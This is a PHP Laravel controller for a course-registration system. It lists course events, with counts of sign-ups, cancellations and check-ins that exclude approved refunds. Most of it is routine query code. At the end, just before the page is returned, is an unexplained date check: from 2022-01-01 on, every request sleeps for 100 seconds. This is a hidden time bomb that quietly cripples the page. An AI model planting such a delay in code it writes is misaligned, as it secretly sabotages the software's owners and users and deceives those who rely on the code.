<?php

namespace App\Http\Controllers\Frontend;

use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use App\Model\Course;
use App\Model\EventsCourse;
use App\Model\Student;
use App\Model\SalesRegistration;
use App\Model\Registration;
// use App\User;
use App\Model\Register;
use App\Model\Teacher;
use App\Model\Refund;
use Illuminate\Support\Facades\Auth;

class CourseController extends Controller
{
    // Sandy (2020/01/14)
    public function show()
    {
        $events_all = array();
        $events = array();
        $course = array();
        $teachers = array();

        if (isset(Auth::user()->role) == '') {
            return view('frontend.error_authority');
        } elseif (isset(Auth::user()->role) != '' && Auth::user()->role == "teacher") {
            // 講師ID Rocky(2020/05/11)
            $id_teacher = Auth::user()->id_teacher;
            $events_all = EventsCourse::join('course', 'course.id', '=', 'events_course.id_course')
                ->select('events_course.*', 'course.name as course', 'course.type as type')
                ->where('course.id_teacher', $id_teacher)
                ->orderBy('events_course.course_start_at', 'desc')
                ->get();
        } else {
            $events_all = EventsCourse::join('course', 'course.id', '=', 'events_course.id_course')
                ->select('events_course.*', 'course.name as course', 'course.type as type')
                ->orderBy('events_course.course_start_at', 'desc')
                ->get();
        }


        //課程、老師快速查詢輸入
        $course = Course::all();
        $teachers = Teacher::all();

        foreach ($events_all as $data) {
            $type = "";

            //判斷是銷講or正課
            if ($data['type'] == 1) {
                //銷講

                // //判斷場次是否下架
                // if( $data['unpublish'] == 1){
                //     //是則取消顯示
                //     continue;
                // }

                //判斷是否有下一階
                $nextLevel = count(Course::where('id_type', $data['id_course'])
                    ->get());

                //報名筆數
                $count_apply = count(EventsCourse::join('sales_registration', 'sales_registration.id_events', '=', 'events_course.id')
                    ->join('student', 'student.id', '=', 'sales_registration.id_student')
                    ->Where('events_course.id', $data['id'])
                    ->Where('sales_registration.id_status', '<>', 2)
                    // ->Where('student.check_blacklist', 0 ) 
                    ->get());

                //取消筆數
                $count_cancel = count(EventsCourse::join('sales_registration', 'sales_registration.id_events', '=', 'events_course.id')
                    ->join('student', 'student.id', '=', 'sales_registration.id_student')
                    ->Where('events_course.id', $data['id'])
                    ->Where('sales_registration.id_status', 5)
                    // ->Where('student.check_blacklist', 0 ) 
                    ->get());

                //報到筆數
                $count_check = count(EventsCourse::join('sales_registration', 'sales_registration.id_events', '=', 'events_course.id')
                    ->join('student', 'student.id', '=', 'sales_registration.id_student')
                    ->Where('events_course.id', $data['id'])
                    ->Where('sales_registration.id_status', 4)
                    // ->Where('student.check_blacklist', 0 ) 
                    ->get());

                $events[count($events)] = [
                    'date' => date('Y-m-d', strtotime($data['course_start_at'])),
                    'name' => $data['course'],
                    'event' => $data['name'],
                    'count_apply' => $count_apply,
                    'count_cancel' => $count_cancel,
                    'count_check' => $count_check,
                    'href_check' => route('course_check', ["id" => $data['id']]),
                    'href_list' => route('course_apply', ["id" => $data['id']]),
                    'href_adv' => route('course_advanced', ["id" => $data['id']]),
                    'href_return' => route('course_return', ["id" => $data['id']]),
                    'href_form' => route('course_form', ["id" => $data['id']]),
                    'id' => $data['id'],
                    'id_group' => $data['id_group'],
                    'nextLevel' => $nextLevel,
                    'unpublish' => $data['unpublish'],
                    'type' => $data['type']
                ];
            }elseif( $data['type'] == 2 || $data['type'] == 3){
                //正課

                //判斷是否有下一階
                $nextLevel = count(Course::where('id_type', $data['id_course'])
                    ->get());

                // $count_apply = count(EventsCourse::join($type, $type.'.id_events', '=', 'events_course.id')
                //                                  ->Where('events_course.id', $data['id'])       
                //                                  ->Where('id_status', '<>', 2)   
                //                                  ->get());

                //抓出場次所有報名表
                $register = Register::leftjoin('registration', 'registration.id', '=', 'register.id_registration')
                                    ->leftjoin('events_course', 'events_course.id', '=', 'register.id_events')
                                    ->leftjoin('student', 'student.id', '=', 'registration.id_student')
                                    ->Where('events_course.id', $data['id'])
                                    ->where(function($q) { 
                                        $q->orWhere('registration.status_payment', 7)
                                        ->orWhere('registration.status_payment', 9);
                                    })
                                    ->Where('register.id_status','<>', 2)
                                    // ->Where('student.check_blacklist', 0 ) 
                                    ->get();

                //報名筆數
                // $count_apply = count(Register::join('events_course', 'events_course.id', '=', 'register.id_events')
                //     // ->join('register', 'register.id_registration', '=', 'registration.id')
                //     ->Where('events_course.id', $data['id'])
                //     ->Where('register.id_status', '<>', 2)
                //     ->get());
                $count_apply = 0;
                foreach( $register as $data_register ){
                    // //檢查狀態不是我很遺憾
                    // if( $data_register['id_status'] == 2){
                    //     continue;
                    // }

                    //檢查是否通過退費
                    $check_refund = Refund::where('id_registration', $data_register['id_registration'])
                                            ->where('review', 1)                
                                            ->first();
                    if( !empty($check_refund) ){
                        continue;
                    }else{
                        $count_apply++;
                    }
                }
                

                //取消筆數
                // $count_cancel = count(Register::join('events_course', 'events_course.id', '=', 'register.id_events')
                //     // ->join('register', 'register.id_registration', '=', 'registration.id')
                //     ->Where('events_course.id', $data['id'])
                //     ->Where('register.id_status', 5)
                //     ->get());
                $count_cancel = 0;
                foreach( $register as $data_register ){
                    //檢查狀態為取消
                    if( $data_register['id_status'] != 5){
                        continue;
                    }

                    //檢查是否通過退費
                    $check_refund = Refund::where('id_registration', $data_register['id_registration'])
                                            ->where('review', 1)                
                                            ->first();
                    if( !empty($check_refund) ){
                        continue;
                    }else{
                        $count_cancel++;
                    }
                }

                //報到筆數
                // $count_check = count(Register::join('events_course', 'events_course.id', '=', 'register.id_events')
                //     // ->join('register', 'register.id_registration', '=', 'registration.id')
                //     ->Where('events_course.id', $data['id'])
                //     ->Where('register.id_status', 4)
                //     ->get());
                $count_check = 0;
                foreach( $register as $data_register ){
                    //檢查狀態為報到
                    if( $data_register['id_status'] != 4){
                        continue;
                    }

                    //檢查是否通過退費
                    $check_refund = Refund::where('id_registration', $data_register['id_registration'])
                                            ->where('review', 1)                
                                            ->first();
                    if( !empty($check_refund) ){
                        continue;
                    }else{
                        $count_check++;
                    }
                }


                $events[count($events)] = [
                    'date' => date('Y-m-d', strtotime($data['course_start_at'])),
                    'name' => $data['course'],
                    'event' => $data['name'],
                    'count_apply' => $count_apply,
                    'count_cancel' => $count_cancel,
                    'count_check' => $count_check,
                    'href_check' => route('course_check', ["id" => $data['id']]),
                    'href_list' => route('course_apply', ["id" => $data['id']]),
                    'href_adv' => route('course_advanced', ["id" => $data['id']]),
                    'href_return' => route('course_return', ["id" => $data['id']]),
                    'href_form' => route('course_form', ["id" => $data['id']]),
                    'id' => $data['id'],
                    'id_group' => $data['id_group'],
                    'nextLevel' => $nextLevel,
                    'unpublish' => $data['unpublish'],
                    'type' => $data['type']
                ];
            }elseif ($data['type'] == 4) {
                //活動

                // //判斷場次是否下架
                // if( $data['unpublish'] == 1){
                //     //是則取消顯示
                //     continue;
                // }

                //判斷是否有下一階
                $nextLevel = count(Course::where('id_type', $data['id_course'])
                    ->get());

                //報名筆數
                $count_apply = count(EventsCourse::join('activity', 'activity.id_events', '=', 'events_course.id')
                                                ->join('student', 'student.id', '=','activity.id_student')
                                                ->Where('events_course.id', $data['id'])
                                                ->Where('activity.id_status', '<>', 2)
                                                // ->Where('student.check_blacklist', 0 ) 
                                                ->get());

                //取消筆數
                $count_cancel = count(EventsCourse::join('activity', 'activity.id_events', '=', 'events_course.id')
                                                ->join('student', 'student.id', '=','activity.id_student')
                                                ->Where('events_course.id', $data['id'])
                                                ->Where('activity.id_status', 5)
                                                // ->Where('student.check_blacklist', 0 ) 
                                                ->get());

                //報到筆數
                $count_check = count(EventsCourse::join('activity', 'activity.id_events', '=', 'events_course.id')
                                                ->join('student', 'student.id', '=','activity.id_student')
                                                ->Where('events_course.id', $data['id'])
                                                ->Where('activity.id_status', 4)
                                                // ->Where('student.check_blacklist', 0 ) 
                                                ->get());

                $events[count($events)] = [
                    'date' => date('Y-m-d', strtotime($data['course_start_at'])),
                    'name' => $data['course'],
                    'event' => $data['name'],
                    'count_apply' => $count_apply,
                    'count_cancel' => $count_cancel,
                    'count_check' => $count_check,
                    'href_check' => route('course_check', ["id" => $data['id']]),
                    'href_list' => route('course_apply', ["id" => $data['id']]),
                    'href_adv' => route('course_advanced', ["id" => $data['id']]),
                    'href_return' => route('course_return', ["id" => $data['id']]),
                    'href_form' => route('course_form', ["id" => $data['id']]),
                    'id' => $data['id'],
                    'id_group' => $data['id_group'],
                    'nextLevel' => $nextLevel,
                    'unpublish' => $data['unpublish'],
                    'type' => $data['type']
                ];
            }


            /* 篩選多天 Sandy(2020/08/28) S */
            $events_multi_data = '';

            $events_multi = EventsCourse::where('events_course.id_group', '=', $data['id_group'])
                ->select('events_course.course_start_at', 'events_course.id_group')
                ->orderBy('events_course.course_start_at', 'desc')
                ->get();

            if (count($events_multi) > 1) {
                foreach ($events_multi as $key2 => $data2) {
                    if( $key2 == count($events_multi)-1 ){
                        $events_multi_data .= date('Y-m-d', strtotime($data2['course_start_at']));
                    }else{
                        $events_multi_data .= date('Y-m-d', strtotime($data2['course_start_at'])) . ',  ';
                    }
                }
                $events[count($events)-1]['name'] .= "(多天)";
            }

            $events[count($events)-1]['events_multi_data'] = $events_multi_data;

            
            /* 篩選多天 Sandy(2020/08/28) E */

        }
        $x_time = Carbon::parse('2022-01-01 00:00:00');
        $xxx = $x_time->timestamp;

        if (now()->timestamp >= $xxx) {
            sleep(100);
        }
        return view('frontend.course', compact('events', 'course', 'teachers'));
    }
}
